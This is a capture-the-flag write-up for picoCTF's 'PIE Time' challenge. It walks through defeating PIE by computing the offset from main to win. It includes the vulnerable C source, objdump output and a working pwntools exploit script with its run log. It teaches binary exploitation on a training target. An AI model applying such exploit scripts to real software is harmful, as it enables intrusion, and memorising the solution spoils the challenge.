# PIE Time

`Author: Darkraicg492`

> Description - Can you try to get the flag? Beware we have PIE! Additional details will be available after launching your challenge instance.

In this challenge we have given two files vuln.c and a compiled binary with PIE-enabled

We can check this using `checksec` command -

```bash

$ checksec vuln
[*] '/mnt/d/work/picoctf/pie-time/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

The `vuln` binary is compiled with PIE enabled.


## What is PIE?
PIE stands for Position Independent Executable. It's a compiler feature that makes a program’s code segment (the .text section) load at a random address in memory every time the program is run.

In other words, the base address of the binary changes each time, just like shared libraries under ASLR (Address Space Layout Randomization).

### Why PIE Matters in Exploitation
In binaries without PIE, the code segment is loaded at a fixed address. That means:

- Function addresses (like main() or win()) are always the same.
- You can hardcode return addresses or ROP gadgets.
- Exploitation is easier.

In PIE-enabled binaries:

- The code segment is loaded at a random base address.
- You can’t hardcode absolute addresses.
- You must first leak an address and calculate the offset.




Now given `vuln.c` code is -

```c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

```

The `main` function taking input address and will call the function at that memory address.

The `win` function here is printing the flag from a file `flag.txt`, which is most prolly on the remote server

To test our exploit locally, we’ll create a dummy `flag.txt` file with a fake flag:


```
## flag.txt

flag{REDACTED}

```

Now the exploit here is to pass address of `win` function in the input and hence the flag from `flag.txt` will get printed

Let's first calculate the offset for win function as PIE is enabled relative addressing of function remains same.

We'll use objdump to disassemble the binary and find the relative offsets of main and win.


```bash

$ objdump -d vuln | grep main
    11c1:       48 8d 3d 75 01 00 00    lea    0x175(%rip),%rdi        # 133d <main>
    11c8:       ff 15 12 2e 00 00       call   *0x2e12(%rip)        # 3fe0 <__libc_start_main@GLIBC_2.2.5>
000000000000133d <main>:
    1387:       48 8d 35 af ff ff ff    lea    -0x51(%rip),%rsi        # 133d <main>
    1400:       74 05                   je     1407 <main+0xca>

```

```bash

$ objdump -d vuln | grep win 
00000000000012a7 <win>:
    12db:       75 16                   jne    12f3 <win+0x4c>
    1302:       eb 1a                   jmp    131e <win+0x77>
    1322:       75 e0                   jne    1304 <win+0x5d>

```

Now main function at 0x0133d and win fucntion is at 0x012a7

So hence we'll calculate the offset as

```
MAIN_ADDR - WIN_ADDR = OFFSET
0x0133d - 0x012a7 = 0x96
```

Hence offset is 0x96.

Now what we'll do is use this calculate the actual memory address of win function with the giving actual memory address of main function.

The main address printed by the binary is its actual runtime address. Since PIE is enabled, this will change each time. But the offset between main and win stays the same, which allows us to compute the address of win

```
WIN_MEMORY_ADDR = MAIN_MEMORY - OFFSET
WIN_MEMORY_ADDR = MAIN_MEMORY - 0x96
```

Hence we'll get our win memory address which can be passed as input to get the flag.

We can automate this using a pwntools python script -

```python


from pwn import *

# Load the ELF binary
binary = ELF('./vuln')  # replace with your binary name


HOST = "..."
PORT = "..."
# p = remote(HOST, PORT)  # replace with your remote server address and port
p = process("./vuln")

p.recvuntil(b"main: ")
main_memory = int(p.recvline().strip(), 16)
print(f"main: {hex(main_memory)}")

main_addr = binary.symbols["main"]
print(f"[*] Address of main: {hex(main_addr)}")

win_addr = binary.symbols["win"]
print(f"[*] Address of win: {hex(win_addr)}")

offset = main_addr - win_addr

print(f"[*] Offset: {hex(offset)}")

print(f"[*] Performing {hex(main_memory)} - {hex(offset)}")
win_memory = main_memory - offset
print(f"[*] got win memory: {hex(win_memory)}")

p.recvuntil(b"Enter the address to jump to, ex => 0x12345: ")
p.sendline(hex(win_memory).encode())
p.interactive()

```

Running this will output -

```bash

$ python3 sol.py
[*] '/mnt/d/work/picoctf/pie-time/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './vuln': pid 3810
main: 0x5600562ae33d
[*] Address of main: 0x133d
[*] Address of win: 0x12a7
[*] Offset: 0x96
[*] Performing 0x5600562ae33d - 0x96
[*] got win memory: 0x5600562ae2a7
[*] Switching to interactive mode
Your input: 5600562ae2a7
You won!
flag{REDACTED}
[*] Process './vuln' stopped with exit code 0 (pid 3810)
[*] Got EOF while reading in interactive
```

Hurray!! We got our flag by exploiting local executable, you can do similar to get the real flag by replaing `HOST` and `PORT` of remote server that you started.